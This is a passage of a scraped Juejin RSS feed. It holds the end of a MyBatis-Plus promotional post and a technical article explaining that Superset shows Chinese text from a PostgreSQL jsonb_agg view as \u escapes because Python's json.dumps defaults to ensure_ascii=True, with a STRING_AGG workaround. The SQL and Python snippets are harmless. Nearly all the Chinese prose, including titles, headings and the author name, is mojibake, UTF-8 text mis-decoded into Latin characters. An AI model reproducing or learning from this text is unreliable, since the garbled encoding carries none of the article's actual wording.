<li>ä½ ç°åœ¨ç”¨çš„æ˜¯ä»€ä¹ˆORMæ¡†æ¶ï¼Ÿæœ‰ä»€ä¹ˆç—›ç‚¹ï¼Ÿ</li>
<li>æŠ•ç¥¨ï¼šä½ ä¼šå°è¯•MyBatis-Pluså—ï¼Ÿ</li>
<li>ç•™è¨€åˆ†äº«ä½ çš„æ•ˆç‡æå‡æŠ€å·§</li>
</ol>
<p>ğŸ¯ <strong>è½¬å‘è¯æœ¯</strong>ï¼š
"å°‘å†™80%çš„ä»£ç ï¼MyBatis-Plusè®©CRUDå¼€å‘å¿«åˆ°é£èµ·ï¼"</p>
<p>ğŸ <strong>ç¦åˆ©</strong>ï¼š</p>
<ol>
<li>ç•™è¨€åŒºæŠ½3äººé€ã€ŠMyBatis-Pluså®æˆ˜æ•™ç¨‹ã€‹</li>
<li>è½¬å‘æˆªå›¾é€ä¼ä¸šçº§ä»£ç ç”Ÿæˆå™¨æ¨¡æ¿</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Superset å±•ç¤º JSONB ä¸­æ–‡å˜å¤©ä¹¦ï¼ŸçœŸç›¸ç«Ÿç„¶æ˜¯ Python çš„â€œè¿‡åº¦ä¿æŠ¤â€]]></title>    <link>https://juejin.cn/post/7589155289191989275</link>    <guid>https://juejin.cn/post/7589155289191989275</guid>    <pubDate>2025-12-30T02:35:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589155289191989275" data-draft-id="7589194558287429670" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Superset å±•ç¤º JSONB ä¸­æ–‡å˜å¤©ä¹¦ï¼ŸçœŸç›¸ç«Ÿç„¶æ˜¯ Python   çš„â€œè¿‡åº¦ä¿æŠ¤â€"/> <meta itemprop="keywords" content="åç«¯,æ•°æ®åº“"/> <meta itemprop="datePublished" content="2025-12-30T02:35:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¹Ÿæ— é£é›¨ä¹Ÿé›¾æ™´"/> <meta itemprop="url" content="https://juejin.cn/user/2175258804632332"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Superset å±•ç¤º JSONB ä¸­æ–‡å˜å¤©ä¹¦ï¼ŸçœŸç›¸ç«Ÿç„¶æ˜¯ Python   çš„â€œè¿‡åº¦ä¿æŠ¤â€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2175258804632332/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¹Ÿæ— é£é›¨ä¹Ÿé›¾æ™´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:35:16.000Z" title="Tue Dec 30 2025 02:35:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ Superset é‡Œç»™è¿è¥åŒå­¦æ­çœ‹æ¿ï¼Œæƒ³å±•ç¤ºä¸€ä¸‹ç”¨æˆ·çš„å¯¹è¯æ—¥å¿—ã€‚æ•°æ®ä» PostgreSQL è§†å›¾é‡Œä¸€æŸ¥ï¼ŒDBeaver é‡Œçœ‹ç€ä¸€åˆ‡æ­£å¸¸ã€‚</p>
<p>ç»“æœä¸€æ”¾åˆ° Superset å›¾è¡¨ä¸Šï¼Œå‚»çœ¼äº†ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/afc2f6971ecb450e9c845183a55b1faa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lmf5peg6aOO6Zuo5Lmf6Zu-5pm0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666915&amp;x-signature=55q%2Bv1Iof3dF%2F1V8sMCMpPrw9rk%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span><span class="hljs-attr">"role"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"user"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"\u4eca\u5929\u5929\u6c14"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span>
</code></pre>
<p>å¥½å¥½çš„ä¸­æ–‡å…¨å˜æˆäº† <code>\uXXXX</code> è¿™ç§å¤©ä¹¦ã€‚</p>
<h2 data-id="heading-0">æ¡ˆå‘ç°åœº</h2>
<p>èƒŒæ™¯æ˜¯è¿™æ ·çš„ï¼šæˆ‘ç”¨ PostgreSQL çš„ FDW åšè·¨åº“æŸ¥è¯¢ï¼Œä¸“é—¨å†™äº†ä¸ªè§†å›¾ <code>v_conversation_summary</code> æŠ•å–‚ç»™ Supersetã€‚ä¸ºäº†æŠŠå¤šè½®å¯¹è¯èšåˆåœ¨ä¸€è¡Œæ˜¾ç¤ºï¼Œæˆ‘ç”¨äº† <code>jsonb_agg</code>ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- åŸå§‹ SQL ç‰‡æ®µ</span>
<span class="hljs-keyword">SELECT</span> jsonb_agg(
    jsonb_build_object(<span class="hljs-string">'role'</span>, tm.role, <span class="hljs-string">'content'</span>, tm.content)
    <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> tm.message_order
) <span class="hljs-keyword">AS</span> å¯¹è¯è®°å½•
...
</code></pre>
<p>é€»è¾‘æ²¡æ¯›ç—…ï¼Œæ•°æ®åº“é‡ŒæŸ¥å‡ºæ¥çš„ç»“æœä¹Ÿæ˜¯æ ‡å‡†çš„ JSON æ•°ç»„ã€‚æ€ä¹ˆåˆ°äº† Superset å‰ç«¯å°±"ä¹±ç "äº†å‘¢ï¼Ÿ</p>
<h3 data-id="heading-1">æ’æ’­ï¼šä¸ºä»€ä¹ˆä¸€å¼€å§‹è¦ç”¨ JSONBï¼Ÿ</h3>
<p>è¿™é‡Œç¨å¾®è§£é‡Šä¸‹ï¼Œä¸ºä»€ä¹ˆæˆ‘ä¹ æƒ¯æ€§åœ°é€‰äº† <code>JSONB</code> è€Œä¸æ˜¯æ™®é€šçš„æ–‡æœ¬æ‹¼æ¥ã€‚</p>
<p>PostgreSQL çš„ <code>JSONB</code> (Binary JSON) æ˜¯ä¸ªéå¸¸å¼ºå¤§çš„ç‰¹æ€§ã€‚ä¸åŒäºæ™®é€šçš„ <code>JSON</code> ç±»å‹ï¼ˆçº¯æ–‡æœ¬å­˜å‚¨ï¼‰ï¼Œ<code>JSONB</code> åœ¨å­˜å‚¨æ—¶ä¼šæŠŠæ•°æ®<strong>è§£æå¹¶è½¬æ¢æˆäºŒè¿›åˆ¶æ ¼å¼</strong>ã€‚</p>
<ul>
<li><strong>å­˜çš„æ—¶å€™</strong>ï¼šå®ƒä¼šæŠŠé”®å€¼å¯¹æ’åºã€å»é‡ã€å‹ç¼©ã€‚</li>
<li><strong>å–çš„æ—¶å€™</strong>ï¼šä¸éœ€è¦å†æ¬¡è§£ææ–‡æœ¬ï¼Œç›´æ¥å°±èƒ½æ‹¿æ¥ç”¨ï¼Œæ€§èƒ½æé«˜ã€‚</li>
<li><strong>æœ€é‡è¦çš„æ˜¯</strong>ï¼šå®ƒæ”¯æŒ <strong>GIN ç´¢å¼•</strong>ã€‚å¦‚æœä½ æƒ³åœ¨å‡ ç™¾ä¸‡æ¡æ•°æ®é‡Œæœ <code>{"role": "user"}</code>ï¼Œç”¨ JSONB æ˜¯æ¯«ç§’çº§çš„ï¼Œç”¨æ–‡æœ¬å­˜å°±æ˜¯å…¨è¡¨æ‰«æã€‚</li>
</ul>
<p>å› ä¸ºä¹ æƒ¯äº†å®ƒçš„é«˜æ€§èƒ½å’Œè§„èŒƒæ€§ï¼Œæˆ‘ä¸‹æ„è¯†åœ°å°±ç”¨äº† <code>jsonb_agg</code>ã€‚æ²¡æƒ³åˆ°ï¼Œæ­£æ˜¯è¿™ä¸ª"äºŒè¿›åˆ¶"çš„ç‰¹æ€§ï¼Œé…åˆä¸Š Python çš„ä¸¥è°¨ï¼Œæå‡ºäº†è¿™æ¬¡çš„ä¹±ç ä¹Œé¾™ã€‚</p>
<h2 data-id="heading-2">ç ´æ¡ˆè¿‡ç¨‹</h2>
<p>ç¬¬ä¸€ååº”é€šå¸¸æ˜¯ï¼š"æ˜¯ä¸æ˜¯æ•°æ®åº“ç¼–ç ä¸å¯¹ï¼Ÿ" æˆ–è€… "Superset çš„ç¼–ç è®¾ç½®æœ‰é—®é¢˜ï¼Ÿ"</p>
<p>ä½†ä»”ç»†ä¸€å¯¹æ¯”å‘ç°ï¼š</p>
<ol>
<li><strong>DBeaver æŸ¥è¯¢</strong>ï¼šæ˜¾ç¤ºå®Œç¾ä¸­æ–‡ã€‚</li>
<li><strong>Superset å±•ç¤º</strong>ï¼šæ˜¾ç¤º Unicode è½¬ä¹‰ç¬¦ã€‚</li>
</ol>
<p>è¿™è¯´æ˜æ•°æ®åº“é‡Œå­˜çš„æ•°æ®æœ¬èº«æ²¡é—®é¢˜ã€‚é—®é¢˜å‡ºåœ¨<strong>ä»æ•°æ®åº“å–å‡ºæ¥ï¼Œåˆ°å‘ç»™æµè§ˆå™¨</strong>çš„è¿™æ®µè·¯ä¸Šã€‚</p>
<h3 data-id="heading-3">çœŸå‡¶ï¼šPython çš„ <code>json.dumps</code></h3>
<p>Superset åç«¯æ˜¯ Python å†™çš„ã€‚å½“å®ƒä» PostgreSQL (é€šè¿‡ <code>psycopg2</code> é©±åŠ¨) æ‹¿åˆ° <code>JSONB</code> ç±»å‹çš„æ•°æ®æ—¶ï¼ŒPython ä¼šæŠŠå®ƒè½¬æ¢æˆå­—å…¸ï¼ˆDictï¼‰ã€‚</p>
<p>å…³é”®ä¸€æ­¥æ¥äº†ï¼šSuperset è¦æŠŠè¿™ä¸ªå­—å…¸ä¼ ç»™å‰ç«¯ï¼Œéœ€è¦æŠŠå®ƒåºåˆ—åŒ–æˆå­—ç¬¦ä¸²ã€‚è¿™æ—¶å€™å®ƒï¼ˆæˆ–è€…åº•å±‚çš„åº“ï¼‰å¤§æ¦‚ç‡è°ƒç”¨äº† Python æ ‡å‡†åº“çš„ <code>json.dumps</code>ã€‚</p>
<p>åœ¨ Python é‡Œï¼Œ<code>json.dumps</code> æœ‰ä¸ªé»˜è®¤è¡Œä¸ºï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> json
data = {<span class="hljs-string">"msg"</span>: <span class="hljs-string">"ä½ å¥½"</span>}

<span class="hljs-comment"># é»˜è®¤ ensure_ascii=True</span>
<span class="hljs-built_in">print</span>(json.dumps(data))
<span class="hljs-comment"># è¾“å‡º: {"msg": "\u4f60\u597d"}  &lt;-- ä¹Ÿå°±æ˜¯æˆ‘ä»¬çœ‹åˆ°çš„"ä¹±ç "</span>
</code></pre>
<p>è¿™ä¸ª <code>ensure_ascii=True</code> é»˜è®¤å¼€å¯ï¼ŒåŸæœ¬æ˜¯ä¸ºäº†å…¼å®¹æ€§â€”â€”ç¡®ä¿ä¸ç®¡å¯¹æ–¹ç³»ç»Ÿå¤šè€æ—§ï¼Œåªè¦èƒ½è®¤ ASCII ç å°±ä¸ä¼šå´©ã€‚ä½†åœ¨æˆ‘ä»¬è¿™ä¸ªåœºæ™¯ä¸‹ï¼Œå®ƒå°±æˆäº†"å¥½å¿ƒåŠåäº‹"ï¼ŒæŠŠåŸæœ¬èƒ½æ­£å¸¸æ˜¾ç¤ºçš„ UTF-8 ä¸­æ–‡å¼ºè¡Œè½¬ä¹‰äº†ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆ DBeaver æ²¡äº‹ï¼Ÿ</strong>
å› ä¸º DBeaver æ˜¯ä¸ªæˆç†Ÿçš„å®¢æˆ·ç«¯ï¼Œå®ƒæ‹¿åˆ°æ•°æ®ååœ¨æœ¬åœ°åšäº†è§£æå’Œæ¸²æŸ“ï¼Œå®ƒ"è®¤è¯†"è¿™äº› Unicode å­—ç¬¦ï¼Œæ‰€ä»¥è´´å¿ƒåœ°å¸®ä½ è½¬å›äº†ä¸­æ–‡ã€‚è€Œ Superset æŠŠå®ƒå½“æˆäº†æ™®é€šå­—ç¬¦ä¸²ç›´æ¥åäº†å‡ºæ¥ã€‚</p>
<h2 data-id="heading-4">æ€ä¹ˆè§£ï¼Ÿ</h2>
<p>æ—¢ç„¶çŸ¥é“äº†æ˜¯åºåˆ—åŒ–çš„é—®é¢˜ï¼Œæ”¹ Superset æºç å»å…³æ‰ <code>ensure_ascii</code> æ˜¾ç„¶åŠ¨é™å¤ªå¤§ï¼Œå®¹æ˜“"æ­¤æ—¶ä¸€æ—¶çˆ½ï¼Œå‡çº§ç«è‘¬åœº"ã€‚</p>
<p>æœ€ä¼˜é›…çš„åŠæ³•ï¼Œå…¶å®æ˜¯<strong>åœ¨æ•°æ®åº“å±‚å°±æŠŠæ ¼å¼ä¿®å¥½</strong>ã€‚</p>
<p>æ—¢ç„¶æˆ‘ä»¬çš„ç›®æ ‡æ˜¯"ç»™äººçœ‹"ï¼ˆè¿è¥çœ‹æ¿ï¼‰ï¼Œè€Œä¸æ˜¯ç»™ç¨‹åºè¯»ï¼Œé‚£ä¸ºä»€ä¹ˆè¦æ‰§ç€äºä¼  JSON æ ¼å¼å‘¢ï¼Ÿç›´æ¥æ‹¼æˆæ˜“è¯»çš„æ–‡æœ¬ä¸æ›´é¦™å—ï¼Ÿ</p>
<p>äºæ˜¯æˆ‘æŠŠ <code>jsonb_agg</code> æ¢æˆäº† <code>STRING_AGG</code>ï¼Œé¡ºæ‰‹è¿˜åŠ äº†ç‚¹ Emoji åšç¾åŒ–ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">(
    <span class="hljs-keyword">SELECT</span> STRING_AGG(
        <span class="hljs-keyword">CASE</span>
            <span class="hljs-keyword">WHEN</span> tm.role <span class="hljs-operator">=</span> <span class="hljs-string">'user'</span> <span class="hljs-keyword">THEN</span> <span class="hljs-string">'ğŸ‘¤ '</span> <span class="hljs-operator">||</span> tm.content      <span class="hljs-comment">-- ç”¨æˆ·è¯´è¯åŠ ä¸ªå°äºº</span>
            <span class="hljs-keyword">WHEN</span> tm.role <span class="hljs-operator">=</span> <span class="hljs-string">'assistant'</span> <span class="hljs-keyword">THEN</span> <span class="hljs-string">'ğŸ¤– '</span> <span class="hljs-operator">||</span> tm.content <span class="hljs-comment">-- AI å›å¤åŠ ä¸ªæœºå™¨äºº</span>
            <span class="hljs-keyword">ELSE</span> tm.role <span class="hljs-operator">||</span> <span class="hljs-string">': '</span> <span class="hljs-operator">||</span> tm.content
        <span class="hljs-keyword">END</span>,
        E<span class="hljs-string">'\n\n'</span> <span class="hljs-comment">-- ç”¨æ¢è¡Œç¬¦éš”å¼€ï¼Œæ¸…æ™°æ˜äº†</span>
        <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> tm.message_order
    )
    <span class="hljs-keyword">FROM</span> task_messages tm
    <span class="hljs-keyword">WHERE</span> tm.task_id <span class="hljs-operator">=</span> t.id
) <span class="hljs-keyword">AS</span> å¯¹è¯è®°å½•
</code></pre>
<p><strong>è¿™æ ·æ”¹çš„ä¸¤ä¸ªçº¢åˆ©ï¼š</strong></p>
<ol>
<li><strong>å½»åº•ç»•è¿‡åºåˆ—åŒ–å‘</strong>ï¼šè¾“å‡ºå˜æˆäº†çº¯æ–‡æœ¬ï¼ˆTextï¼‰ï¼ŒSuperset æ‹¿åˆ°ä»€ä¹ˆå°±æ˜¾ç¤ºä»€ä¹ˆï¼ŒPython å†ä¹Ÿä¸ä¼šè‡ªä½œå¤šæƒ…å»è½¬ä¹‰å®ƒã€‚</li>
<li><strong>è¿è¥ä½“éªŒæ‹‰æ»¡</strong>ï¼šå»æ‰äº†å†·å†°å†°çš„ <code>{"role":...}</code> èŠ±æ‹¬å·å’Œå¼•å·ï¼Œç›´æ¥æ˜¾ç¤ºå¯¹è¯æµï¼Œè¿è¥åŒå­¦çœ‹æ•°æ®çœ¼ç›ä¹Ÿä¸ç´¯äº†ã€‚</li>
</ol>
<h2 data-id="heading-5">é™„ï¼šæ·±åº¦ç§‘æ™® PostgreSQL çš„ JSONB</h2>
<p>æ—¢ç„¶æåˆ°äº† JSONBï¼Œé¡ºä¾¿å¤šèŠä¸¤å¥ã€‚å¾ˆå¤šåŒå­¦ä» MySQL è½¬è¿‡æ¥ï¼Œå¯èƒ½è§‰å¾—"ä¸å°±æ˜¯å­˜ JSON å˜›ï¼Œæœ‰å•¥åŒºåˆ«ï¼Ÿ"</p>
<p>å…¶å® PG é‡Œçš„ <code>json</code> å’Œ <code>jsonb</code> å®Œå…¨æ˜¯ä¸¤ä¸ªç‰©ç§ã€‚</p>
<h3 data-id="heading-6">1. å®ƒæ˜¯"ç†Ÿ"çš„ï¼Œä¸æ˜¯"ç”Ÿ"çš„</h3>
<ul>
<li><strong>JSON</strong> ç±»å‹å°±åƒæŠŠè‚‰å†»åœ¨å†°ç®±é‡Œï¼Œä½ å­˜è¿›å»æ˜¯ä»€ä¹ˆæ ·ï¼ˆåŒ…æ‹¬ç©ºæ ¼ã€é”®çš„é¡ºåºã€é‡å¤é”®ï¼‰ï¼Œå–å‡ºæ¥å°±æ˜¯ä»€ä¹ˆæ ·ã€‚å®ƒæœ¬è´¨ä¸Šå°±æ˜¯ä¸ª<strong>å¸¦æ ¡éªŒçš„æ–‡æœ¬</strong>ã€‚</li>
<li><strong>JSONB</strong> åˆ™æ˜¯æŠŠè‚‰åšæˆäº†ç†Ÿé£Ÿã€‚å­˜è¿›å»çš„æ—¶å€™ï¼Œæ•°æ®åº“ä¼šæŠŠå®ƒ<strong>è§£æã€å»é‡ã€æ’åº</strong>ï¼Œè½¬æ¢æˆä¸€ç§é«˜æ•ˆçš„<strong>äºŒè¿›åˆ¶æ ¼å¼</strong>ã€‚
<ul>
<li><strong>ä¼˜ç‚¹</strong>ï¼šè¯»çš„æ—¶å€™ä¸éœ€è¦é‡æ–°è§£æï¼Œé€Ÿåº¦é£å¿«ï¼›æ”¯æŒç´¢å¼•ã€‚</li>
<li><strong>ç¼ºç‚¹</strong>ï¼šå†™å…¥æ—¶å¤šäº†ä¸€æ­¥è§£æï¼Œç¨å¾®æ…¢ä¸€ä¸¢ä¸¢ï¼›åŸæœ¬çš„ç©ºæ ¼å’Œæ ¼å¼ä¼šä¸¢å¤±ã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-7">2. æ€æ‰‹é”ï¼šGIN ç´¢å¼•</h3>
<p>JSONB æœ€å¤§çš„å¨åŠ›åœ¨äºå®ƒæ”¯æŒ <strong>GIN (Generalized Inverted Index) ç´¢å¼•</strong>ã€‚</p>
<p>å‡è®¾ä½ æœ‰ä¸€äº¿è¡Œæ—¥å¿—ï¼Œå­˜äº†ä¸ª <code>payload</code> å­—æ®µï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- æŸ¥æ‰€æœ‰"ç”¨æˆ·IDä¸º10086"çš„æ“ä½œè®°å½•</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> logs <span class="hljs-keyword">WHERE</span> payload @<span class="hljs-operator">&gt;</span> <span class="hljs-string">'{"user_id": 10086}'</span>;
</code></pre>
<ul>
<li>å¦‚æœæ˜¯æ™®é€š <strong>JSON</strong>ï¼šæ•°æ®åº“å¾—ä¸€è¡Œè¡ŒæŠŠæ–‡æœ¬è¯»å‡ºæ¥ï¼Œè§£æï¼Œå†æ¯”å¯¹â€”â€”è¿™å°±æ˜¯ç¾éš¾ã€‚</li>
<li>å¦‚æœæ˜¯ <strong>JSONB + ç´¢å¼•</strong>ï¼šå®ƒå¯ä»¥ç›´æ¥å®šä½åˆ°åŒ…å«è¿™ä¸ªé”®å€¼å¯¹çš„è¡Œï¼Œé€Ÿåº¦å’ŒæŸ¥ä¸»é”®å·®ä¸å¤šã€‚</li>
</ul>
<h3 data-id="heading-8">3. é¿å‘æŒ‡å—ï¼šåˆ°åº•é€‰è°ï¼Ÿ</h3>



































<table><thead><tr><th align="left">åœºæ™¯</th><th align="left">æ¨èç±»å‹</th><th align="left">ç†ç”±</th></tr></thead><tbody><tr><td align="left"><strong>åªæ˜¯åšæ—¥å¿—å½’æ¡£</strong></td><td align="left"><strong>JSON</strong></td><td align="left">å†™å…¥å¿«ï¼ŒåŸæ ·ä¿ç•™åŸå§‹è¯·æ±‚ä½“ï¼ˆå“ªæ€•æ ¼å¼å¾ˆä¸‘ï¼‰</td></tr><tr><td align="left"><strong>Webç«¯é€ä¼ å‚æ•°</strong></td><td align="left"><strong>JSON</strong></td><td align="left">æ—¢ç„¶åç«¯ä¸å¤„ç†ï¼Œå°±åˆ«è´¹åŠ²è½¬äºŒè¿›åˆ¶äº†</td></tr><tr><td align="left"><strong>ç»å¸¸è¦æ ¹æ®å­—æ®µæŸ¥è¯¢</strong></td><td align="left"><strong>JSONB</strong></td><td align="left"><strong>å¿…é€‰</strong>ï¼Œä¸ºäº†ç”¨ç´¢å¼•</td></tr><tr><td align="left"><strong>é¢‘ç¹æ›´æ–°å±€éƒ¨å­—æ®µ</strong></td><td align="left"><strong>JSONB</strong></td><td align="left"><code>jsonb_set</code> ä¿®æ”¹æ€§èƒ½æ›´å¥½</td></tr><tr><td align="left"><strong>ç»™ BI å·¥å…·åšå±•ç¤º</strong></td><td align="left"><strong>Text</strong></td><td align="left">å°±åƒæœ¬æ–‡é‡åˆ°çš„å‘ï¼Œç›´æ¥ç”¨ SQL æ‹¼æˆå­—ç¬¦ä¸²æœ€å®‰å…¨ï¼</td></tr></tbody></table>
<h2 data-id="heading-9">å°ç»“</h2>
<p>é‡åˆ°è¿™ç§"æ•°æ®åº“æŸ¥ç€å¯¹ï¼Œå‰ç«¯æ˜¾ç¤ºä¹±"çš„é—®é¢˜ï¼Œå°¤å…¶æ˜¯æ¶‰åŠ JSON çš„æ—¶å€™ï¼Œå¤šåŠæ˜¯ä¸­é—´å±‚çš„åºåˆ—åŒ–é…ç½®åœ¨ä½œå¦–ã€‚</p>
<p>è™½ç„¶æŠ€æœ¯ä¸Šæˆ‘ä»¬å¯ä»¥é€šè¿‡é…ç½®è§£å†³ç¼–ç é—®é¢˜ï¼Œä½†<strong>è½¬æ¢æ€ç»´</strong>å¾€å¾€èƒ½æ‰¾åˆ°æ›´å¥½çš„è·¯ï¼šæ—¢ç„¶æ˜¯åšå±•ç¤ºï¼Œä¸å¦‚ç›´æ¥åœ¨ SQL é‡ŒæŠŠæ•°æ®åŠ å·¥æˆæœ€é€‚åˆé˜…è¯»çš„æ ·å­ã€‚æ—¢è§£å†³äº†ä¹±ç ï¼Œåˆä¼˜åŒ–äº†æ’ç‰ˆï¼Œä¸€ä¸¾ä¸¤å¾—ã€‚</p>
<hr/>
<p>å¦‚æœä½ è§‰å¾—è¿™ç¯‡æ–‡ç« æœ‰å¸®åŠ©ï¼Œæ¬¢è¿å…³æ³¨æˆ‘çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i" target="_blank" title="https://github.com/tt-a1i" ref="nofollow noopener noreferrer">GitHub</a>ï¼Œä¸‹é¢æ˜¯æˆ‘çš„ä¸€äº›å¼€æºé¡¹ç›®ï¼š</p>
